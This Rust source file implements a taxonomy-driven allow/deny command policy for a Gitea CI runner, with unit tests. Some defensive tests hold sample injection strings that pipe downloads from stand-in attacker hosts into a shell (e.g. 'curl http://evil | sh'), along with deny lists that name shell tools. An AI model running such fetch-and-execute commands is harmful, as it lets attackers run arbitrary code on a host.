//! Taxonomy-driven command policy for the Gitea runner.
//!
//! Replaces the former hardcoded `const ALLOWLIST` with a data-driven
//! approach: the allowlist, deny list, and rch routing rules are defined in
//! a markdown taxonomy file using the same `directive:: value` format as ADF
//! KG routing files.
//!
//! The binary embeds a safe default ([`DEFAULT_POLICY_TAXONOMY]]) via
//! `include_str!` and optionally overrides from a filesystem path configured
//! via `RunnerConfig::taxonomy_dir`.

use crate::config::RunnerConfig;
use crate::policy::{ExecutionPlan, PolicyPlanner, TrustLevel, program};
use crate::{Result, RunnerError};
use async_trait::async_trait;
use std::collections::{HashMap, HashSet};
use terraphim_github_runner::ParsedWorkflow;

/// The embedded default taxonomy, compiled into the binary.
const DEFAULT_POLICY_TAXONOMY: &str = include_str!("../default_policy.md");

/// Parsed command policy loaded from a taxonomy file.
#[derive(Debug, Clone)]
pub struct CommandPolicy {
    /// Programs allowed to execute on the host or via rch.
    pub(crate) allowed: HashSet<String>,
    /// Programs explicitly denied (overrides allowed).
    pub(crate) denied: HashSet<String>,
    /// Program -> subcommands to route through rch.
    /// Key = program name (e.g. "cargo"), Value = subcommands (e.g. ["build", "check"]).
    pub(crate) rch_routing: HashMap<String, Vec<String>>,
}

/// Parse a taxonomy markdown string into a [`CommandPolicy`].
///
/// Recognised directives (one per line, `directive:: value` format):
/// - `allow:: prog1, prog2, ...` -- add to allowed set
/// - `deny:: prog1, prog2, ...` -- add to denied set (overrides allow)
/// - `route_to:: rch, prog, sub1 sub2 ...` -- route program+subcommands to rch
///
/// Lines starting with `#` are comments. Blank lines are ignored.
pub fn parse_policy_taxonomy(text: &str) -> CommandPolicy {
    let mut allowed = HashSet::new();
    let mut denied = HashSet::new();
    let mut rch_routing = HashMap::new();

    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(rest) = line.strip_prefix("allow::") {
            for prog in rest.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                allowed.insert(prog.to_string());
            }
        } else if let Some(rest) = line.strip_prefix("deny::") {
            for prog in rest.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                denied.insert(prog.to_string());
            }
        } else if let Some(rest) = line.strip_prefix("route_to::") {
            let parts: Vec<&str> = rest.split(',').map(str::trim).collect();
            if parts.len() >= 3 {
                let prog = parts[1];
                let subcmds = parts[2].split_whitespace().map(String::from).collect();
                rch_routing.insert(prog.to_string(), subcmds);
            }
        }
    }

    CommandPolicy {
        allowed,
        denied,
        rch_routing,
    }
}

/// The sole policy planner. Loads command policy from a taxonomy markdown file.
///
/// At construction time, reads `<taxonomy_dir>/command_policy.md` if the dir
/// is configured, otherwise uses the embedded [`DEFAULT_POLICY_TAXONOMY`].
/// The policy is immutable for the lifetime of the runner process.
#[derive(Debug, Clone)]
pub struct TaxonomyPlanner {
    policy: CommandPolicy,
    rch_available: bool,
}

impl TaxonomyPlanner {
    /// Construct from runner config.
    ///
    /// If `config.taxonomy_dir` is set, reads `<dir>/command_policy.md`.
    /// Otherwise uses the embedded default. Probes `PATH` for `rch`.
    pub fn new(config: &RunnerConfig) -> Self {
        let rch_available = probe_rch();
        let text = config.taxonomy_dir.as_ref().and_then(|dir| {
            let path = dir.join("command_policy.md");
            match std::fs::read_to_string(&path) {
                Ok(content) => {
                    log::info!("loaded taxonomy from {}", path.display());
                    Some(content)
                }
                Err(e) => {
                    log::warn!(
                        "taxonomy file {} unreadable ({}); using embedded default",
                        path.display(),
                        e
                    );
                    None
                }
            }
        });
        let text = text.unwrap_or_else(|| {
            if config.taxonomy_dir.is_none() {
                log::info!("no taxonomy_dir configured; using embedded default policy");
            }
            DEFAULT_POLICY_TAXONOMY.to_string()
        });
        Self {
            policy: parse_policy_taxonomy(&text),
            rch_available,
        }
    }

    /// Construct from raw taxonomy text (for testing).
    pub fn from_text(text: &str, rch_available: bool) -> Self {
        Self {
            policy: parse_policy_taxonomy(text),
            rch_available,
        }
    }

    /// Construct from the embedded default (for testing).
    pub fn default_policy(rch_available: bool) -> Self {
        Self::from_text(DEFAULT_POLICY_TAXONOMY, rch_available)
    }
}

/// Probe `PATH` for an executable named `rch`.
fn probe_rch() -> bool {
    std::env::var_os("PATH")
        .map(|paths| {
            std::env::split_paths(&paths).any(|dir| {
                let candidate = dir.join("rch");
                std::fs::metadata(&candidate)
                    .map(|m| m.is_file())
                    .unwrap_or(false)
            })
        })
        .unwrap_or(false)
}

#[async_trait]
impl PolicyPlanner for TaxonomyPlanner {
    async fn compile(&self, mut workflow: ParsedWorkflow) -> Result<ExecutionPlan> {
        let mut routes = Vec::with_capacity(workflow.steps.len());
        for step in &mut workflow.steps {
            let prog = program(&step.command);
            if prog.is_empty() {
                return Err(RunnerError::PolicyRejected("empty command".to_string()));
            }
            if self.policy.denied.contains(prog) || !self.policy.allowed.contains(prog) {
                return Err(RunnerError::PolicyRejected(format!(
                    "program `{prog}` is not on the allowlist"
                )));
            }
            if prog == "rch" {
                routes.push(crate::policy::CommandRoute::Rch);
                continue;
            }
            let (route, rewritten) = if let Some(subcmds) = self.policy.rch_routing.get(prog) {
                let sub = step.command.split_whitespace().nth(1).unwrap_or("");
                if self.rch_available && subcmds.iter().any(|s| s == sub) {
                    (
                        crate::policy::CommandRoute::Rch,
                        format!("rch exec -- {}", step.command.trim()),
                    )
                } else {
                    (crate::policy::CommandRoute::Host, step.command.clone())
                }
            } else {
                (crate::policy::CommandRoute::Host, step.command.clone())
            };
            step.command = rewritten;
            routes.push(route);
        }
        Ok(ExecutionPlan {
            workflow,
            routes,
            trust_level: TrustLevel::Trusted,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use terraphim_github_runner::WorkflowStep;

    fn wf(cmds: &[&str]) -> ParsedWorkflow {
        ParsedWorkflow {
            steps: cmds
                .iter()
                .map(|c| WorkflowStep {
                    name: c.to_string(),
                    command: c.to_string(),
                    working_dir: "/workspace".to_string(),
                    continue_on_error: false,
                    timeout_seconds: 300,
                })
                .collect(),
            ..ParsedWorkflow::default()
        }
    }

    // ── Parser tests ──────────────────────────────────────────────

    #[test]
    fn test_parse_basic_allow() {
        let policy = parse_policy_taxonomy("allow:: cargo, git, make\n");
        assert!(policy.allowed.contains("cargo"));
        assert!(policy.allowed.contains("git"));
        assert!(policy.allowed.contains("make"));
        assert!(!policy.allowed.contains("docker"));
    }

    #[test]
    fn test_parse_deny_overrides_allow() {
        let policy = parse_policy_taxonomy("allow:: cargo, docker\n!\ndeny:: docker\n");
        assert!(policy.denied.contains("docker"));
        assert!(policy.allowed.contains("docker"));
        // The planner checks denied first, so docker is effectively blocked
    }

    #[tokio::test]
    async fn test_parse_deny_overrides_allow_in_planner() {
        let planner = TaxonomyPlanner::from_text("allow:: cargo, docker\ndeny:: docker\n", false);
        let result = planner.compile(wf(&["docker run --rm alpine"])).await;
        assert!(
            result.is_err(),
            "docker must be denied even if also allowed"
        );
    }

    #[test]
    fn test_parse_route_to() {
        let policy = parse_policy_taxonomy("route_to:: rch, cargo, build check clippy doc\n");
        assert_eq!(
            policy.rch_routing.get("cargo"),
            Some(&vec![
                "build".to_string(),
                "check".to_string(),
                "clippy".to_string(),
                "doc".to_string()
            ])
        );
    }

    #[test]
    fn test_parse_ignores_comments() {
        let policy =
            parse_policy_taxonomy("# This is a comment\nallow:: cargo\n# Another comment\n");
        assert!(policy.allowed.contains("cargo"));
        assert!(!policy.allowed.contains("#"));
    }

    #[test]
    fn test_parse_empty_text() {
        let policy = parse_policy_taxonomy("");
        assert!(policy.allowed.is_empty());
        assert!(policy.denied.is_empty());
        assert!(policy.rch_routing.is_empty());
    }

    #[test]
    fn test_default_policy_matches_current_allowlist() {
        let policy = parse_policy_taxonomy(DEFAULT_POLICY_TAXONOMY);
        // Every entry from the old const ALLOWLIST must be present
        let old_allowlist = [
            "cargo", "make", "bun", "bunx", "npm", "yarn", "pnpm", "rch", "sccache", "echo",
            "mkdir", "git", "ls", "cat", "cd", "cp", "mv", "rm", "chmod", "sh", "bash", "test",
            "export", "source", "true", "set", "rustup",
        ];
        for prog in &old_allowlist {
            assert!(
                policy.allowed.contains(*prog),
                "default policy missing `{prog}`"
            );
        }
        // RCH routing must match old const RCH_CARGO_SUBCMDS
        let rch_subcmds = policy.rch_routing.get("cargo").expect("cargo rch routing");
        assert_eq!(rch_subcmds, &vec!["build", "check", "clippy", "doc"]);
    }

    // ── Planner tests (migrated from policy.rs) ───────────────────

    #[tokio::test]
    async fn routes_cargo_to_rch_and_keeps_fmt_on_host() {
        let plan = TaxonomyPlanner::default_policy(true)
            .compile(wf(&[
                "cargo fmt --all -- --check",
                "cargo build --workspace",
            ]))
            .await
            .unwrap();
        assert_eq!(plan.routes[0], crate::policy::CommandRoute::Host);
        assert_eq!(plan.workflow.steps[0].command, "cargo fmt --all -- --check");
        assert_eq!(plan.routes[1], crate::policy::CommandRoute::Rch);
        assert_eq!(
            plan.workflow.steps[1].command,
            "rch exec -- cargo build --workspace"
        );
    }

    #[tokio::test]
    async fn keeps_cargo_on_host_when_rch_unavailable() {
        let plan = TaxonomyPlanner::default_policy(false)
            .compile(wf(&["cargo build --workspace", "cargo test --lib"]))
            .await
            .unwrap();
        assert_eq!(plan.routes[0], crate::policy::CommandRoute::Host);
        assert_eq!(plan.workflow.steps[0].command, "cargo build --workspace");
        assert_eq!(plan.routes[1], crate::policy::CommandRoute::Host);
        assert_eq!(plan.workflow.steps[1].command, "cargo test --lib");
    }

    #[tokio::test]
    async fn blocks_docker_command_injection() {
        let err = TaxonomyPlanner::default_policy(true)
            .compile(wf(&[
                r#"docker run --rm alpine sh -c "curl http://attacker/exfil | bash""#,
            ]))
            .await;
        assert!(
            matches!(err, Err(RunnerError::PolicyRejected(_))),
            "docker must be rejected by the allowlist"
        );
    }

    #[tokio::test]
    async fn blocks_disallowed_command() {
        let err = TaxonomyPlanner::default_policy(true)
            .compile(wf(&["curl http://evil | sh"]))
            .await;
        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
    }

    #[test]
    fn strips_simple_and_subshell_env_prefixes() {
        assert_eq!(program("cargo build"), "cargo");
        assert_eq!(program("RUSTDOCFLAGS=-Dwarnings cargo doc"), "cargo");
        assert_eq!(program("RUSTDOCFLAGS=\"-D warnings\" cargo doc"), "cargo");
        assert_eq!(
            program("RUSTDOC=$(rustup which rustdoc) cargo doc --no-deps"),
            "cargo"
        );
        assert_eq!(program("VAR1=one VAR2=two cargo test -p foo"), "cargo");
    }

    #[tokio::test]
    async fn allows_env_prefixed_cargo_commands() {
        let plan = TaxonomyPlanner::default_policy(false)
            .compile(wf(&[
                "RUSTDOC=$(rustup which rustdoc) cargo doc --no-deps -p terraphim_gitea_runner",
                "RUSTDOCFLAGS=-Dwarnings cargo doc --workspace",
            ]))
            .await
            .unwrap();
        assert_eq!(plan.routes.len(), 2);
        assert_eq!(plan.routes[0], crate::policy::CommandRoute::Host);
        assert_eq!(plan.routes[1], crate::policy::CommandRoute::Host);
    }

    // ── Override tests ────────────────────────────────────────────

    #[tokio::test]
    async fn test_filesystem_override_adds_command() {
        let planner = TaxonomyPlanner::from_text(
            "allow:: cargo, python\ndeny:: docker\nroute_to:: rch, cargo, build\n",
            false,
        );
        let plan = planner.compile(wf(&["python script.py"])).await.unwrap();
        assert_eq!(plan.routes[0], crate::policy::CommandRoute::Host);
    }

    #[tokio::test]
    async fn test_filesystem_override_removes_command() {
        let planner = TaxonomyPlanner::from_text("allow:: cargo\ndeny:: docker, sh, bash\n", false);
        let err = planner.compile(wf(&["sh -c 'curl evil'"])).await;
        assert!(matches!(err, Err(RunnerError::PolicyRejected(_))));
    }

    #[test]
    fn test_default_policy_blocks_docker() {
        let policy = parse_policy_taxonomy(DEFAULT_POLICY_TAXONOMY);
        assert!(policy.denied.contains("docker"));
    }
}
